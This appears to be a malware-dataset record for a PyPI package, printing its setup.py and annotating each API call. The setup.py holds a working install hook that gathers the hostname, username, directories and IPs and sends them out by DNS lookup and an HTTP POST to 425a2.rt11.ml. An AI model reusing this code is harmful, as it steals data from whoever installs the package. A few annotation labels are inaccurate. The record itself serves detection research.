{
  "metadata": {
    "package_name": "azure-cli-ml-private-preview-99.10.0",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/azure-cli-ml-private-preview-99.10.0.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/azure-cli-ml-private-preview-99.10.0.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import requests\nimport socket\nimport getpass\nimport os\nimport json\nimport sys\ntry:\n    import netifaces\nexcept:\n    pass\n\npname=\"azure-cli-ml-private-preview\"\n\ndef getFiles(paths):\n    ufiles = []\n    for mpath in paths:\n        try:\n            files = os.listdir(mpath)\n            for ufile in files:\n                ufiles.append(os.path.join(mpath,ufile))\n        except:\n            pass\n    return ufiles\n\ndef isprivate(ip):\n   if ip.startswith('fe80::') or ip == \"::1\":\n       return True\n   parts = ip.split('.')\n   return parts[0] == '10' or (parts[0] == '172' and (int(parts[1]) >= 16 and int(parts[1]) <= 31)) or (parts[0] == '192' and parts[1] == '168') or (parts[0] == '127' and parts[1] == '0' and parts[2] == '0')\n\ndef todashedip(ip):\n    return ip.replace('.','-').replace(':','-')\n\ndef gethttpips():\n    addresses = []\n    try:\n        addresses=[netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET in netifaces.ifaddresses(iface)]\n        addresses+=[netifaces.ifaddresses(iface)[netifaces.AF_INET6][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET6 in netifaces.ifaddresses(iface)]\n    except:\n        pass\n    return addresses\n\ndef getIps():\n    addresses = []\n    result = []\n    try:\n        addresses=[netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET in netifaces.ifaddresses(iface)]\n        addresses+=[netifaces.ifaddresses(iface)[netifaces.AF_INET6][0]['addr'] for iface in netifaces.interfaces() if netifaces.AF_INET6 in netifaces.ifaddresses(iface)]\n    except:\n        pass\n    for addr in addresses:\n        if not isprivate(addr):\n            result.append(addr)\n            if \".\" in addr:\n                return \"i.\"+todashedip(addr)+\".i\"\n    if len(result)>0:\n        return \"i.\"+todashedip(result[0])+\".i\"\n    else:\n        return \"i._.i\"\n    \n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        try:\n            dn = \"\"\n            hn = hostname.encode().hex()\n            un = username.encode().hex()\n            pn = pname.encode().hex()\n            ip = getIps()\n            dn = hn+\".\"+pn+\".\"+un+\".p\"\n            cs = cwd.split('/')\n            for i in range(len(cs)):\n                cs[i] = cs[i].encode().hex()\n            path = \"\"\n            for c in cs:\n                if c != \"\" and c != None:\n                    path = path+\".\"+c\n            path = path.strip('.')\n            dn = dn+\".\"+path+\".p\"\n            dn = dn+\".\"+ip\n            dn = dn+\".425a2.rt11.ml\"\n            socket.gethostbyname(dn)\n        except Exception as e:\n            print(\"exception\")\n            print(e)\n            pass\n        ploads = {\"msg\":json.dumps({'hostname':hostname,'cwd':cwd,'username':username,\"ipaddresses\":json.dumps(gethttpips()),\"dirs\":json.dumps(getFiles([\"c:\\\\\",\"d:\\\\\",\"/\",\"/home\"]))})}\n        requests.post(\"https://425a2.rt11.ml\",data = ploads)\n",
          "triple_sequences": [
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "mpath",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "mpath, ufile",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "ip.split()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "ip",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "netifaces.interfaces()",
              "action_description": "List network interfaces",
              "action_id": "list_network_interfaces",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "netifaces.ifaddresses()",
              "action_description": "Access network interface configuration",
              "action_id": "access_network_interface_config",
              "object": "iface",
              "object_description": "Network interface name",
              "object_id": "network_interface_name",
              "intention_description": "Access network interface MAC address file",
              "intention_id": "access_network_interface_mac"
            },
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system hostname",
              "intention_id": "get_system_hostname"
            },
            {
              "action_api": "os.getcwd()",
              "action_description": "Returns current working directory",
              "action_id": "get_working_dir",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect current working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "getpass.getuser()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "hostname",
              "object_description": "Current hostname",
              "object_id": "current_hostname",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "bytes.hex()",
              "action_description": "Converts bytes to hexadecimal string",
              "action_id": "convert_bytes_to_hex",
              "object": "hostname.encode()",
              "object_description": "Current hostname",
              "object_id": "current_hostname",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "username",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "bytes.hex()",
              "action_description": "Converts bytes to hexadecimal string",
              "action_id": "convert_bytes_to_hex",
              "object": "username.encode()",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "pname",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "bytes.hex()",
              "action_description": "Converts bytes to hexadecimal string",
              "action_id": "convert_bytes_to_hex",
              "object": "pname.encode()",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "cwd.split()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "cwd",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "cs[i]",
              "object_description": "Local file or directory name",
              "object_id": "local_file_or_directory_name",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "bytes.hex()",
              "action_description": "Converts bytes to hexadecimal string",
              "action_id": "convert_bytes_to_hex",
              "object": "cs[i].encode()",
              "object_description": "Local file or directory name",
              "object_id": "local_file_or_directory_name",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "socket.gethostbyname()",
              "action_description": "Resolves host name to IPv4 address",
              "action_id": "resolve_hostname",
              "object": "dn",
              "object_description": "Domain name string",
              "object_id": "domain_name",
              "intention_description": "Resolve hostname to IP address",
              "intention_id": "resolve_hostname_ip"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "{'hostname':hostname,'cwd':cwd,'username':username,\"ipaddresses\":json.dumps(gethttpips()),\"dirs\":json.dumps(getFiles([\"c:\\\\\",\"d:\\\\\",\"/\",\"/home\"]))}",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "gethttpips()",
              "action_description": "Returns list of network interface indices and names",
              "action_id": "list_network_interfaces",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect IP address",
              "intention_id": "collect_ip_address"
            },
            {
              "action_api": "getFiles()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "[\"c:\\\\\",\"d:\\\\\",\"/\",\"/home\"]",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://425a2.rt11.ml, data = ploads",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit environment data to remote server",
              "intention_id": "transmit_environment_data_server"
            }
          ]
        }
      ]
    }
  ]
}